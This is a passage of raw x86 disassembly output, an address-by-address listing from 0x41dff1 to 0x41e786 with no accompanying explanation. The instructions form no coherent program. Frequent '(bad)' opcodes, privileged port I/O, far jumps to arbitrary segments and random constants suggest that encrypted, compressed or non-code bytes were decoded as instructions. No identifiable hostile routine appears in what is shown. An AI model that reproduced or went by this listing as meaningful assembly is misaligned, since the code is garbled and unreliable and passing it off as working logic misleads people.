  41dff1:	fild   DWORD PTR [edx+0x49]
  41dff4:	enter  0xfe7d,0x24
  41dff8:	or     esi,ebx
  41dffa:	pop    ecx
  41dffb:	adc    al,0x36
  41dffd:	shl    DWORD PTR [ebx],cl
  41dfff:	adc    DWORD PTR [edx+edi*1+0x36],ebx
  41e003:	adc    cl,BYTE PTR [esi+0x38]
  41e006:	push   0xb86c1376
  41e00b:	sbb    al,0x18
  41e00d:	pop    ebp
  41e00e:	fadd   DWORD PTR [ecx-0x648d34e5]
  41e014:	scas   al,BYTE PTR es:[edi]
  41e015:	in     eax,0x5d
  41e017:	jge    0x41dffe
  41e019:	ret    0x7f38
  41e01c:	or     cl,BYTE PTR [edx-0x23]
  41e01f:	push   cs
  41e020:	mov    al,ds:0xb5ec8b3a
  41e025:	xchg   ebp,eax
  41e026:	sbb    ebx,0x1b01140a
  41e02c:	retf   0xc494
  41e02f:	repz sbb eax,DWORD PTR [eax]
  41e032:	ds loop 0x41e055
  41e035:	xchg   esp,eax
  41e036:	inc    ebx
  41e037:	add    bl,BYTE PTR ds:0xd0bdf9eb
  41e03d:	sbb    al,0x38
  41e03f:	(bad)  
  41e040:	mov    ds:0x3b4cdcb3,eax
  41e045:	cmp    bl,BYTE PTR [esp+eax*1+0x2f]
  41e049:	pop    eax
  41e04a:	test   al,0xb2
  41e04c:	adc    eax,0x6bebc42d
  41e051:	leave  
  41e052:	test   al,0x83
  41e054:	popf   
  41e055:	rcr    DWORD PTR es:[ecx+0x79],1
  41e059:	mov    al,0x28
  41e05b:	mov    eax,ds:0x46325a3f
  41e060:	or     ah,cl
  41e062:	mov    DWORD PTR [edi+0x63],edx
  41e065:	sar    DWORD PTR [eax],cl
  41e067:	mov    ebx,0x21654ddc
  41e06c:	mov    al,ds:0x480f280b
  41e071:	adc    DWORD PTR [esi+0xaef407c],eax
  41e077:	sub    al,0x15
  41e079:	std    
  41e07a:	cld    
  41e07b:	jg     0x41e0d5
  41e07d:	pop    ecx
  41e07e:	popf   
  41e07f:	mov    dl,0xe2
  41e081:	rcr    BYTE PTR [edx-0x55],1
  41e084:	push   0xffffffc2
  41e086:	jbe    0x41e030
  41e088:	test   al,0x69
  41e08a:	cld    
  41e08b:	add    eax,0x9d1c3d63
  41e090:	add    ecx,DWORD PTR [esi+0x7fe92cee]
  41e096:	out    dx,eax
  41e097:	jae    0x41e08c
  41e099:	mov    eax,ds:0x37430d7
  41e09e:	daa    
  41e09f:	mov    eax,0x5e097587
  41e0a4:	or     al,0x6b
  41e0a6:	imul   eax,DWORD PTR [edi-0x25],0x75
  41e0aa:	jl     0x41e047
  41e0ac:	ret    
  41e0ad:	hlt    
  41e0ae:	xchg   esi,eax
  41e0af:	sub    ebp,esi
  41e0b1:	push   ecx
  41e0b2:	imul   eax,DWORD PTR ds:0xa364b165,0x24
  41e0b9:	sub    al,0x18
  41e0bb:	aaa    
  41e0bc:	and    dh,BYTE PTR [esi+0x6c812df7]
  41e0c2:	ins    DWORD PTR es:[edi],dx
  41e0c3:	mov    ecx,DWORD PTR [ebp+0x3edf9e37]
  41e0c9:	fsubr  DWORD PTR ss:[eax-0x24]
  41e0cd:	bound  esp,QWORD PTR ds:0xf96e0a11
  41e0d3:	mov    dh,0xa3
  41e0d5:	sub    ecx,DWORD PTR [edx]
  41e0d7:	fs stos BYTE PTR es:[edi],al
  41e0d9:	push   edi
  41e0da:	inc    ecx
  41e0db:	adc    DWORD PTR [ecx],eax
  41e0dd:	or     eax,0x65a869bd
  41e0e2:	(bad)  [eax]
  41e0e4:	cmp    BYTE PTR [ebx+0x73],cl
  41e0e7:	popa   
  41e0e8:	outs   dx,BYTE PTR ds:[esi]
  41e0e9:	je     0x41e141
  41e0eb:	xchg   DWORD PTR [edi],edx
  41e0ed:	pushf  
  41e0ee:	hlt    
  41e0ef:	xlat   BYTE PTR ds:[ebx]
  41e0f0:	cmp    DWORD PTR [ebx-0x6d7e6871],eax
  41e0f6:	sahf   
  41e0f7:	cmp    eax,0xa240d9dc
  41e0fc:	adc    al,0x53
  41e0fe:	sub    edi,eax
  41e100:	cli    
  41e101:	mov    esp,0x96b10e27
  41e106:	lods   eax,DWORD PTR ds:[esi]
  41e107:	inc    esp
  41e108:	push   edi
  41e109:	cld    
  41e10a:	sbb    al,BYTE PTR [edx+0x1d]
  41e10d:	add    BYTE PTR [esi+0x6f],dh
  41e110:	push   0x69364248
  41e115:	xchg   DWORD PTR [ebx+edi*4],ebx
  41e118:	aad    0x93
  41e11a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e11b:	inc    ebx
  41e11c:	jl     0x41e141
  41e11e:	sbb    DWORD PTR [ebp-0x2c],ebx
  41e121:	add    BYTE PTR [ebp+edx*2-0x640e58f8],0x45
  41e129:	lock nop
  41e12b:	ret    0x1ec1
  41e12e:	in     eax,dx
  41e12f:	jmp    0x6706e75f
  41e134:	mov    ecx,0xe7eec5b5
  41e139:	repnz sbb al,0x95
  41e13c:	call   0x1356a483
  41e141:	icebp  
  41e142:	mov    al,0xe9
  41e144:	or     edx,DWORD PTR [edx]
  41e146:	arpl   WORD PTR [ecx],si
  41e148:	rcl    BYTE PTR [edi+0x78],1
  41e14b:	out    dx,eax
  41e14c:	pop    ebx
  41e14d:	xor    DWORD PTR [ebx-0x3acc5b3a],eax
  41e153:	inc    ebx
  41e154:	push   ebx
  41e155:	mov    dl,cl
  41e157:	sbb    dl,BYTE PTR [ecx+0x2a]
  41e15a:	dec    eax
  41e15b:	inc    esi
  41e15c:	xchg   ecx,eax
  41e15d:	and    al,0x86
  41e15f:	mov    ah,0x4e
  41e161:	dec    eax
  41e162:	adc    BYTE PTR [edx+0x21],bl
  41e165:	fistp  WORD PTR [ebx+ebp*4-0xb31df3c]
  41e16c:	push   ds
  41e16d:	shr    BYTE PTR [ebx-0x52690012],0x9b
  41e174:	push   ds
  41e175:	pop    ecx
  41e176:	pushf  
  41e177:	shl    ebp,cl
  41e179:	xor    al,0x84
  41e17b:	jmp    0x41e1c9
  41e17d:	les    edx,FWORD PTR [eax-0x5620a7f]
  41e183:	jmp    0x9d5018f8
  41e188:	(bad)  
  41e18a:	mov    ebp,DWORD PTR [ecx]
  41e18c:	(bad)  
  41e18d:	mov    cs,WORD PTR [edx+0x67]
  41e190:	mov    edx,0x5c679315
  41e195:	mov    esp,DWORD PTR [eax+0x7e]
  41e198:	mov    edi,0x72ea52f7
  41e19d:	ficom  DWORD PTR [ebp+ebp*8-0x2cd83405]
  41e1a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1a5:	pop    ecx
  41e1a6:	sti    
  41e1a7:	inc    ebx
  41e1a8:	sar    DWORD PTR [ecx+0x53],1
  41e1ab:	je     0x41e179
  41e1ad:	jno    0x41e1d9
  41e1af:	sub    DWORD PTR [eax],esi
  41e1b1:	and    edx,esp
  41e1b3:	out    dx,al
  41e1b4:	cmp    ah,cl
  41e1b6:	jmp    0xe651:0x69d0d877
  41e1bd:	mov    edi,0xc8dfd82
  41e1c2:	inc    ecx
  41e1c3:	mov    ecx,0x1e49e37
  41e1c8:	imul   esp,DWORD PTR [eax-0x1745a8b4],0xffffff8c
  41e1cf:	inc    esp
  41e1d0:	loop   0x41e1ed
  41e1d2:	dec    ebx
  41e1d3:	pop    edx
  41e1d4:	inc    ecx
  41e1d5:	mov    dl,BYTE PTR [esi]
  41e1d7:	sbb    DWORD PTR [edi-0x3c],edx
  41e1da:	pop    esi
  41e1db:	out    dx,al
  41e1dc:	sub    al,0x64
  41e1de:	retf   0x6bc0
  41e1e1:	mov    bh,0xeb
  41e1e3:	pop    ss
  41e1e4:	xlat   BYTE PTR ds:[ebx]
  41e1e5:	fadd   QWORD PTR [ebx+0x25]
  41e1e8:	dec    eax
  41e1e9:	push   ds
  41e1ea:	fcomp  st(4)
  41e1ec:	and    esi,DWORD PTR [edx+0x25061305]
  41e1f2:	mov    esi,0x42568187
  41e1f7:	push   cs
  41e1f8:	aam    0xad
  41e1fa:	push   esp
  41e1fb:	adc    ch,BYTE PTR [ebp-0x46032817]
  41e201:	mov    edi,0x387a50b4
  41e206:	fs inc ebp
  41e208:	out    0x16,eax
  41e20a:	xlat   BYTE PTR ds:[ebx]
  41e20b:	adc    al,0x79
  41e20d:	mov    al,ds:0xcc1e167d
  41e212:	or     BYTE PTR [ecx],dh
  41e214:	fiadd  DWORD PTR [ecx-0x2b9e4ef9]
  41e21a:	fadd   st(3),st
  41e21c:	(bad)  
  41e21d:	mov    gs,WORD PTR [edx+0x7e44a6de]
  41e223:	sar    DWORD PTR [eax+0x3e],0x75
  41e227:	and    eax,0x4074e1be
  41e22c:	jnp    0x41e269
  41e22e:	inc    edx
  41e22f:	jle    0x41e29e
  41e231:	mov    ds:0xacc87ac1,eax
  41e236:	or     al,0x88
  41e238:	mov    esp,0xd75bf1a5
  41e23d:	push   edi
  41e23e:	mov    esi,0xd4a727d7
  41e243:	mov    al,BYTE PTR [ecx]
  41e245:	jge    0x41e293
  41e247:	jp     0x41e20e
  41e249:	sub    BYTE PTR [esi-0x7c],0xa1
  41e24d:	push   esp
  41e24e:	adc    eax,0x25f16b85
  41e253:	lods   al,BYTE PTR ds:[esi]
  41e254:	mov    dx,?
  41e257:	clc    
  41e258:	(bad)  
  41e259:	xchg   edx,eax
  41e25a:	mov    ebp,0x2354b018
  41e25f:	lods   al,BYTE PTR ds:[esi]
  41e260:	mov    WORD PTR [edx+0x2b3da24c],ss
  41e266:	call   FWORD PTR [edx]
  41e268:	call   0x9b44e059
  41e26d:	ss sbb esi,0x14cd147f
  41e274:	sbb    BYTE PTR [edi-0xf],0x0
  41e278:	pop    ds
  41e279:	outs   dx,BYTE PTR ds:[esi]
  41e27a:	sbb    esi,esi
  41e27c:	mov    cl,0xfd
  41e27e:	xor    DWORD PTR [edi-0x4e7b6b0],ecx
  41e284:	cmp    eax,0x427b2cd6
  41e289:	jmp    DWORD PTR [ebx-0x6767ac89]
  41e28f:	ss (bad) 
  41e291:	retf   
  41e292:	push   ds
  41e293:	aam    0x55
  41e295:	pop    esp
  41e296:	mov    ds:0xaddb1abd,al
  41e29b:	pop    ecx
  41e29c:	scas   al,BYTE PTR es:[edi]
  41e29d:	push   0xd38384d0
  41e2a2:	imul   edi,DWORD PTR ds:0xac1c82f,0x681141fa
  41e2ac:	mov    esi,0x342d811b
  41e2b1:	and    BYTE PTR [eax+0x6b],dh
  41e2b4:	shl    BYTE PTR [eax-0x9],cl
  41e2b7:	shl    BYTE PTR [esp+eax*8],cl
  41e2ba:	pop    esp
  41e2bb:	sub    al,0x3e
  41e2bd:	add    BYTE PTR [eax],dh
  41e2bf:	pop    DWORD PTR [ecx]
  41e2c1:	stos   BYTE PTR es:[edi],al
  41e2c2:	(bad)  
  41e2c4:	jnp    0x41e340
  41e2c6:	xlat   BYTE PTR ds:[ebx]
  41e2c7:	fwait
  41e2c8:	test   BYTE PTR [ecx+0x55],bh
  41e2cb:	push   edi
  41e2cc:	(bad)  
  41e2cd:	retf   
  41e2ce:	jp     0x41e313
  41e2d0:	add    esi,DWORD PTR [ebx+0x45266e9c]
  41e2d6:	adc    bh,BYTE PTR [edx]
  41e2d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2d9:	dec    ebp
  41e2da:	(bad)  
  41e2db:	jb     0x41e30c
  41e2dd:	call   0x3034:0x6a3fe580
  41e2e4:	mov    al,0x85
  41e2e6:	or     DWORD PTR [edx],0x5b2935cb
  41e2ec:	stos   DWORD PTR es:[edi],eax
  41e2ed:	leave  
  41e2ee:	fdivr  DWORD PTR [esi-0x54]
  41e2f1:	cli    
  41e2f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2f3:	dec    ebx
  41e2f4:	jns    0x41e2ee
  41e2f6:	jl     0x41e2f1
  41e2f8:	retf   
  41e2f9:	inc    esp
  41e2fa:	loop   0x41e2c4
  41e2fc:	ja     0x41e331
  41e2fe:	sbb    edx,0xffffff8d
  41e301:	xor    esi,DWORD PTR [esi+ebp*1-0x1f]
  41e305:	push   edx
  41e306:	imul   ebp,eax,0x57
  41e309:	push   0x1b
  41e30b:	and    BYTE PTR [eax+0x1869f09c],al
  41e311:	lods   eax,DWORD PTR ds:[esi]
  41e312:	xor    ah,BYTE PTR [esi]
  41e314:	sub    eax,0x3536d441
  41e319:	jle    0x41e329
  41e31b:	push   edi
  41e31c:	mov    ds:0x4a0fec12,eax
  41e321:	mov    edi,DWORD PTR [esp+ecx*8-0x2a]
  41e325:	bswap  edi
  41e327:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e328:	mov    al,ds:0x1b2effcf
  41e32d:	shl    dl,cl
  41e32f:	cmp    esp,DWORD PTR [eax]
  41e331:	add    ch,cl
  41e333:	shr    BYTE PTR [ebp+eax*8+0x7c2cda35],0xe2
  41e33b:	cld    
  41e33c:	jle    0x41e36d
  41e33e:	std    
  41e33f:	ret    
  41e340:	sbb    BYTE PTR [esi-0x73],0x5
  41e344:	cmp    eax,0x62d4a90e
  41e349:	sar    DWORD PTR [esi-0x45],cl
  41e34c:	ins    DWORD PTR es:[edi],dx
  41e34d:	(bad)  
  41e34f:	fsub   QWORD PTR [ecx+ecx*2+0x3]
  41e353:	scas   al,BYTE PTR es:[edi]
  41e354:	fdivr  DWORD PTR [edx+0x53af614f]
  41e35a:	imul   eax,DWORD PTR [eax+0x3aa94249],0x61
  41e361:	mov    dh,0x4f
  41e363:	sbb    esi,ebx
  41e365:	fst    DWORD PTR [eax]
  41e367:	popa   
  41e368:	test   eax,0x5fa01413
  41e36d:	xchg   edx,eax
  41e36e:	or     bl,BYTE PTR [ebx+0x6e]
  41e371:	jb     0x41e3c3
  41e373:	push   0xffffffdd
  41e375:	repnz push eax
  41e377:	lahf   
  41e378:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e379:	jnp    0x41e388
  41e37b:	dec    ebx
  41e37c:	cld    
  41e37d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e37e:	ret    
  41e37f:	xlat   BYTE PTR ds:[ebx]
  41e380:	mov    ecx,0x38ebbc37
  41e385:	cwde   
  41e386:	jbe    0x41e404
  41e388:	mov    dh,0xdf
  41e38a:	leave  
  41e38b:	fstp   TBYTE PTR [eax]
  41e38d:	xor    eax,0xb01559c6
  41e392:	jl     0x41e3d8
  41e394:	jb     0x41e410
  41e396:	fidivr WORD PTR [edi-0x40]
  41e399:	sbb    edi,ecx
  41e39b:	ja     0x41e366
  41e39d:	inc    eax
  41e39e:	ret    0xcad5
  41e3a1:	mov    dx,?
  41e3a4:	fisttp QWORD PTR [edi+0x1e73ec95]
  41e3aa:	mov    al,ds:0x590ac127
  41e3af:	inc    ebx
  41e3b0:	inc    ebp
  41e3b1:	dec    ecx
  41e3b2:	test   al,0x8
  41e3b4:	sti    
  41e3b5:	imul   ecx,DWORD PTR [ecx+0x43],0xffffffaf
  41e3b9:	mov    ah,0x6b
  41e3bb:	call   DWORD PTR [ebx-0x2a]
  41e3be:	mov    al,BYTE PTR [eax-0x243858e8]
  41e3c4:	repz cmp ah,ah
  41e3c7:	je     0x41e3fc
  41e3c9:	sbb    eax,0x2645a212
  41e3ce:	pop    ecx
  41e3cf:	pop    ebx
  41e3d0:	pop    edx
  41e3d1:	cmp    DWORD PTR [eax-0x6],eax
  41e3d4:	add    al,0xea
  41e3d6:	cmp    ah,BYTE PTR [esi-0x41904754]
  41e3dc:	cdq    
  41e3dd:	popa   
  41e3de:	int    0xcd
  41e3e0:	lahf   
  41e3e1:	and    cl,cl
  41e3e3:	mov    cl,0x90
  41e3e5:	fisubr WORD PTR [edi-0x71cdcffc]
  41e3eb:	mov    WORD PTR [ebx+0x7fb4fdb],?
  41e3f1:	mov    ecx,fs
  41e3f3:	lock das 
  41e3f5:	pop    es
  41e3f6:	add    dl,al
  41e3f8:	pop    ss
  41e3f9:	or     al,0xa1
  41e3fb:	xchg   ecx,eax
  41e3fc:	or     eax,0xd46fdf7a
  41e401:	pop    ecx
  41e402:	xor    esi,esp
  41e404:	ret    0xc36b
  41e407:	gs mov dh,0x1a
  41e40a:	dec    esp
  41e40b:	out    dx,al
  41e40c:	repz imul ecx,esp,0x6f
  41e410:	ror    ecx,0x3f
  41e413:	lds    edi,FWORD PTR [edi]
  41e415:	ins    DWORD PTR es:[edi],dx
  41e416:	jmp    0xdb3de846
  41e41b:	std    
  41e41c:	pop    edi
  41e41d:	lahf   
  41e41e:	or     edx,ebx
  41e420:	push   ebx
  41e421:	sub    BYTE PTR [edx],0xe8
  41e424:	in     al,0x9e
  41e426:	mov    eax,ds:0x606b91d
  41e42b:	xor    BYTE PTR [esi-0x3e],ch
  41e42e:	mov    esi,?
  41e430:	pop    ebx
  41e431:	gs loop 0x41e442
  41e434:	or     al,0xa8
  41e436:	pusha  
  41e437:	aad    0x14
  41e439:	push   edx
  41e43a:	inc    esp
  41e43b:	cmp    ebp,DWORD PTR [edx]
  41e43d:	xchg   esp,eax
  41e43e:	pop    ebx
  41e43f:	xchg   edx,eax
  41e440:	daa    
  41e441:	add    dl,BYTE PTR [edi-0x78]
  41e444:	or     eax,0xea6720c
  41e449:	aad    0xd2
  41e44b:	dec    esi
  41e44c:	fstp   st(6)
  41e44e:	loop   0x41e48a
  41e450:	mul    DWORD PTR [edx-0x27]
  41e453:	jmp    0x9a9:0x9bca3d4a
  41e45a:	repz retf 0xd80e
  41e45e:	sub    DWORD PTR [ecx-0x5dd0d127],edx
  41e464:	adc    al,0x6a
  41e466:	mov    ecx,0x3700e39e
  41e46b:	mov    ah,0xf9
  41e46d:	mul    BYTE PTR ds:0x71b0540
  41e473:	ins    DWORD PTR es:[edi],dx
  41e474:	out    dx,eax
  41e475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e476:	sub    dl,bl
  41e478:	les    ecx,FWORD PTR [ebx-0x76]
  41e47b:	push   0xf879c65
  41e480:	sbb    esp,esi
  41e482:	mov    DWORD PTR [edi],ecx
  41e484:	or     DWORD PTR [eax-0x5d],ebp
  41e487:	jmp    0xdb7c:0x8c117dc6
  41e48e:	sbb    ebx,DWORD PTR [esi]
  41e490:	or     ah,dh
  41e492:	mov    ch,0x33
  41e494:	popf   
  41e495:	xor    ebp,esi
  41e497:	jns    0x41e4b1
  41e499:	and    BYTE PTR [eax-0x1b],cl
  41e49c:	jg     0x41e4a1
  41e49e:	jbe    0x41e42b
  41e4a0:	stc    
  41e4a1:	cmc    
  41e4a2:	ret    
  41e4a3:	loope  0x41e49a
  41e4a5:	stos   DWORD PTR es:[edi],eax
  41e4a6:	call   0xaf7a:0xb925e20c
  41e4ad:	mov    ebx,0xb3c155aa
  41e4b2:	xchg   edx,eax
  41e4b3:	push   0x47b5160
  41e4b8:	cmp    eax,0x8b66bae8
  41e4bd:	ja     0x41e4c3
  41e4bf:	xor    al,0x22
  41e4c1:	popf   
  41e4c2:	js     0x41e538
  41e4c4:	jns    0x41e480
  41e4c6:	aaa    
  41e4c7:	fwait
  41e4c8:	shl    DWORD PTR [ecx-0x38],cl
  41e4cb:	das    
  41e4cc:	push   edx
  41e4cd:	push   eax
  41e4ce:	pop    esp
  41e4cf:	xchg   cl,ch
  41e4d1:	or     DWORD PTR [edx-0x2a91f689],esp
  41e4d7:	das    
  41e4d8:	enter  0xdd60,0x31
  41e4dc:	ret    0xeee8
  41e4df:	enter  0xf7eb,0xe
  41e4e3:	pop    ss
  41e4e4:	lahf   
  41e4e5:	leave  
  41e4e6:	and    al,0xde
  41e4e8:	and    bh,dh
  41e4ea:	jnp    0x41e4e6
  41e4ec:	or     eax,0xf26bfebd
  41e4f1:	push   eax
  41e4f2:	loopne 0x41e55c
  41e4f4:	vpcmpgtw xmm4,xmm5,xmm5
  41e4f8:	(bad)  
  41e4f9:	out    dx,al
  41e4fa:	addr16 xchg ecx,eax
  41e4fc:	mov    ds:0x13cc9ef7,al
  41e501:	push   eax
  41e502:	clc    
  41e503:	xchg   ecx,eax
  41e504:	xor    eax,0xcb507609
  41e509:	sbb    BYTE PTR [edx+0x24],al
  41e50c:	push   ecx
  41e50d:	xor    ch,BYTE PTR ds:0xdf33542e
  41e513:	inc    edx
  41e514:	outs   dx,BYTE PTR ds:[esi]
  41e515:	leave  
  41e516:	rol    dl,0x9
  41e519:	dec    ebp
  41e51a:	inc    esi
  41e51b:	(bad)  ds:0xc0aca13
  41e521:	cmp    bh,BYTE PTR [esi+0x1a]
  41e524:	push   edi
  41e525:	pop    eax
  41e526:	stos   BYTE PTR es:[edi],al
  41e527:	(bad)  [eax-0x67]
  41e52a:	std    
  41e52b:	inc    ecx
  41e52c:	lods   al,BYTE PTR ds:[esi]
  41e52d:	xor    BYTE PTR [edi+0x43],ah
  41e530:	gs ins DWORD PTR es:[edi],dx
  41e532:	ret    0xdda3
  41e535:	shl    bh,1
  41e537:	cmp    ebx,ebx
  41e539:	xchg   ecx,eax
  41e53a:	(bad)  
  41e53b:	mov    eax,0x7a44a4ad
  41e540:	xchg   edx,eax
  41e541:	sub    BYTE PTR [ebp+0x43e5e85d],0x91
  41e548:	adc    eax,0x6e2d752c
  41e54d:	xchg   edi,eax
  41e54e:	fcomp  DWORD PTR [edi+edi*4]
  41e551:	hlt    
  41e552:	scas   eax,DWORD PTR es:[edi]
  41e553:	ja     0x41e4e9
  41e555:	push   eax
  41e556:	lds    ebp,FWORD PTR [eax]
  41e558:	push   ss
  41e559:	lea    ebx,[edx+0x5f92017d]
  41e55f:	test   BYTE PTR [ebp+0x7],bh
  41e562:	(bad)  
  41e563:	jmp    0x41e50d
  41e565:	xor    ch,ch
  41e567:	push   ebp
  41e568:	mov    ecx,0xed90cff0
  41e56d:	jb     0x41e573
  41e56f:	enter  0x8d72,0xbe
  41e573:	inc    ebp
  41e574:	ret    
  41e575:	cmp    BYTE PTR [eax+esi*8+0x67550f1d],bh
  41e57c:	push   ebp
  41e57d:	loope  0x41e596
  41e57f:	in     eax,0x3e
  41e581:	test   DWORD PTR [ebx+0x6dc952ca],ecx
  41e587:	lea    edi,[edi-0x6f2aec9]
  41e58d:	sub    ah,BYTE PTR [eax-0xe5749e0]
  41e593:	adc    DWORD PTR [esi+ebx*4],esp
  41e596:	nop
  41e597:	mov    eax,ds:0x4f92023e
  41e59c:	push   esi
  41e59d:	pop    es
  41e59e:	out    0xfa,eax
  41e5a0:	clc    
  41e5a1:	jg     0x41e55b
  41e5a3:	mov    WORD PTR [ecx-0x7e],ss
  41e5a6:	mov    esi,0xb9fbf913
  41e5ab:	int    0x82
  41e5ad:	shr    DWORD PTR [ebx],1
  41e5af:	push   0xa6622df8
  41e5b4:	xchg   edx,eax
  41e5b5:	gs push es
  41e5b7:	xor    bl,BYTE PTR [ebx-0x26]
  41e5ba:	mov    gs,WORD PTR [ebp+0xe]
  41e5bd:	adc    BYTE PTR [eax-0x6a],bh
  41e5c0:	or     eax,DWORD PTR [ebp+esi*4+0x7d4850d1]
  41e5c7:	mov    ecx,0x12fa054d
  41e5cc:	inc    edi
  41e5cd:	mov    ebx,0x8660c3aa
  41e5d2:	aaa    
  41e5d3:	push   edx
  41e5d4:	jmp    0x28a5:0x38c9fb6b
  41e5db:	push   esi
  41e5dc:	cmp    al,0xde
  41e5de:	jp     0x41e5e7
  41e5e0:	pop    esp
  41e5e1:	mov    ds:0x86d9b1b5,eax
  41e5e6:	call   0x6ce0:0x59b2d4c1
  41e5ed:	mov    al,BYTE PTR [ebx]
  41e5ef:	rol    BYTE PTR [eax],1
  41e5f1:	sar    DWORD PTR [ecx],1
  41e5f3:	dec    edx
  41e5f4:	mov    ch,0x94
  41e5f6:	aas    
  41e5f7:	xor    eax,DWORD PTR [edi-0x796f29a6]
  41e5fd:	adc    DWORD PTR [ecx+0x33],ebp
  41e600:	xchg   BYTE PTR [eax+0x4e],cl
  41e603:	push   ecx
  41e604:	push   eax
  41e605:	pop    eax
  41e606:	mov    al,ds:0x4b9fd991
  41e60b:	mov    gs,WORD PTR [edi+0x28bae511]
  41e611:	inc    esi
  41e612:	imul   edx,DWORD PTR [eax+0x6ea854ae],0xffffffb9
  41e619:	mov    bh,0xe6
  41e61b:	je     0x41e675
  41e61d:	leave  
  41e61e:	ret    
  41e61f:	int    0x26
  41e621:	pushf  
  41e622:	in     eax,0x31
  41e624:	arpl   WORD PTR [esi-0x63510e50],ax
  41e62a:	or     BYTE PTR ds:0x5ea5de60,ch
  41e630:	(bad)  
  41e631:	sub    bl,BYTE PTR [ecx-0x7efcc841]
  41e637:	inc    edx
  41e638:	mov    ds:0x8c754adb,eax
  41e63d:	popa   
  41e63e:	mov    ch,0x45
  41e640:	xor    al,0x71
  41e642:	fimul  DWORD PTR [ebp+edx*1-0x47]
  41e646:	xchg   ebp,eax
  41e647:	xchg   BYTE PTR [edx+eiz*4+0x24],dh
  41e64b:	loopne 0x41e612
  41e64d:	repz add eax,0xbeef25de
  41e653:	inc    esi
  41e654:	jb     0x41e6d0
  41e656:	xchg   ebp,eax
  41e657:	sub    eax,0xfbab9c4e
  41e65c:	test   al,0x3c
  41e65e:	lds    ebx,FWORD PTR [eax-0x4b]
  41e661:	adc    eax,0xf7bcbde3
  41e666:	xor    DWORD PTR [ebp+0x4],0x6d
  41e66a:	int3   
  41e66b:	(bad)  
  41e66c:	loopne 0x41e62a
  41e66e:	or     BYTE PTR ds:0x8e77c924,0x15
  41e675:	pop    ss
  41e676:	mov    WORD PTR [edi+0x3696e122],ss
  41e67c:	js     0x41e636
  41e67e:	outs   dx,DWORD PTR ds:[esi]
  41e67f:	arpl   sp,sp
  41e681:	fist   DWORD PTR [ecx-0x17]
  41e684:	out    dx,al
  41e685:	xor    al,0xf3
  41e687:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e688:	mov    ds:0xdbaf69b1,al
  41e68d:	lock or BYTE PTR [ebx],0x42
  41e691:	inc    ebx
  41e692:	sar    ecx,0x9c
  41e695:	mov    ch,BYTE PTR [eax-0x73]
  41e698:	sub    ebp,edx
  41e69a:	repz cmc 
  41e69c:	into   
  41e69d:	pop    esi
  41e69e:	or     DWORD PTR [eax+0x1f],ecx
  41e6a1:	shl    BYTE PTR [ecx+0x4c67c829],0x67
  41e6a8:	xchg   ebx,eax
  41e6a9:	pop    ss
  41e6aa:	jmp    0x41e701
  41e6ac:	fdivr  DWORD PTR [bp+si]
  41e6af:	sti    
  41e6b0:	aam    0xab
  41e6b2:	ret    
  41e6b3:	mov    cl,0x47
  41e6b5:	shr    DWORD PTR [ebp-0x5],1
  41e6b8:	sub    eax,0xe7cbd9e3
  41e6bd:	push   cs
  41e6be:	enter  0x3deb,0x4f
  41e6c2:	cmp    BYTE PTR [ecx-0x1de5ebf9],0x4b
  41e6c9:	inc    ecx
  41e6ca:	test   DWORD PTR [esi],edi
  41e6cc:	dec    ecx
  41e6cd:	icebp  
  41e6ce:	retf   0xf3be
  41e6d1:	mov    al,ds:0x5f06c473
  41e6d6:	imul   esp
  41e6d8:	cmp    bl,dl
  41e6da:	stos   DWORD PTR es:[edi],eax
  41e6db:	inc    esp
  41e6dc:	mov    dh,0x31
  41e6de:	push   eax
  41e6df:	ds inc eax
  41e6e1:	jle    0x41e700
  41e6e3:	mov    ds:0x2ba95e3f,al
  41e6e8:	adc    ecx,DWORD PTR [ebp+0x7e59d94b]
  41e6ee:	ret    
  41e6ef:	jge    0x41e706
  41e6f1:	add    DWORD PTR [ecx+0x86d048e],edi
  41e6f7:	scas   al,BYTE PTR es:[edi]
  41e6f8:	add    ecx,DWORD PTR ds:0x2a0bcbf2
  41e6fe:	mov    dh,0x17
  41e700:	arpl   WORD PTR [ebp+0x52db0efe],cx
  41e706:	aaa    
  41e707:	fnsave [ecx*4-0x50cd5810]
  41e70e:	aam    0x62
  41e710:	rcr    DWORD PTR [ecx-0xf],1
  41e713:	jo     0x41e77f
  41e715:	je     0x41e790
  41e717:	xor    bl,bh
  41e719:	(bad)  
  41e71a:	hlt    
  41e71b:	inc    edi
  41e71c:	dec    esp
  41e71d:	daa    
  41e71e:	push   ecx
  41e71f:	ret    0x774e
  41e722:	int    0xe3
  41e724:	or     al,0x5
  41e726:	ret    
  41e727:	push   cs
  41e728:	shl    ecx,cl
  41e72a:	pop    ebx
  41e72b:	pop    ss
  41e72c:	add    ah,bh
  41e72e:	fs jb  0x41e71c
  41e731:	push   edi
  41e732:	repnz mov DWORD PTR [ebp+0x5962157a],esp
  41e739:	cld    
  41e73a:	ror    DWORD PTR [edx+0x4b],1
  41e73d:	mov    ds:0x5d75ef32,eax
  41e742:	and    DWORD PTR ds:0x45ed0019,ebp
  41e748:	sub    bh,BYTE PTR [ebx-0xf]
  41e74b:	xor    esp,DWORD PTR [ecx]
  41e74d:	dec    ebp
  41e74e:	call   0x62f0e3bb
  41e753:	call   DWORD PTR [ebx+0x2f]
  41e756:	fldenvw [ebp-0x4a]
  41e75a:	xor    BYTE PTR [edi],bh
  41e75c:	jecxz  0x41e735
  41e75e:	repz sub eax,0x13dd129d
  41e764:	pop    ebp
  41e765:	stos   DWORD PTR es:[edi],eax
  41e766:	lds    esi,FWORD PTR [ebx]
  41e768:	adc    dh,BYTE PTR [ecx-0x62ac3d46]
  41e76e:	inc    edx
  41e76f:	xchg   ebx,eax
  41e770:	ret    0xc681
  41e773:	jle    0x41e72f
  41e775:	adc    ecx,DWORD PTR [esi]
  41e777:	mov    DWORD PTR [edi+0xd8c42fc],ebx
  41e77d:	inc    eax
  41e77e:	mov    dh,ch
  41e780:	sti    
  41e781:	pop    ss
  41e782:	dec    esi
  41e783:	test   DWORD PTR [esi],edx
  41e785:	daa    
  41e786:	mov    esi,DWORD PTR ds:0xfe003da9
